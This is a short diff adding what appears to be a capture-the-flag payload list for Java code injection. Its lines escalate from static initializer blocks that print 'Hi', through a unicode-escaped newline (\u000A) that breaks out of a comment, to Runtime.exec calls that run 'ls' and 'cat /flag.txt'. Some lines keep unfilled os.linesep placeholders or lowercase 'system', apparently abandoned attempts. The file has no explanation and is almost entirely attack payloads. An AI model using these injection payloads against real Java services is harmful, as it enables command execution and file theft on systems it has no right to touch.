@@ -1,0 +1,14 @@
+{{os.linesep}}
+static {{ System.out.println("Hi"); }}{os.linesep}
+{os.linesep}static { System.out.println("Hi"); }{os.linesep}
+
+{os.linesep}static {{os.linesep}var br = new BufferedReader(new FileReader("/flag.txt"));{os.linesep}system.out.println(br.readLine());{os.linesep}}
+
+
+ \u000Astatic { System.out.println("Hi"); }
+
+  \u000Astatic { System.out.println("Hi"); Runtime.getRuntime().exec("ls").getInputStream().transferTo(System.out); }
+
+\u000Astatic { try { Runtime.getRuntime().exec("ls").getInputStream().transferTo(System.out); } catch (IOException e) { e.printStackTrace(); }; }
+
+\u000Astatic { try { Runtime.getRuntime().exec("cat /flag.txt").getInputStream().transferTo(System.out); } catch (IOException e) { e.printStackTrace(); }; }
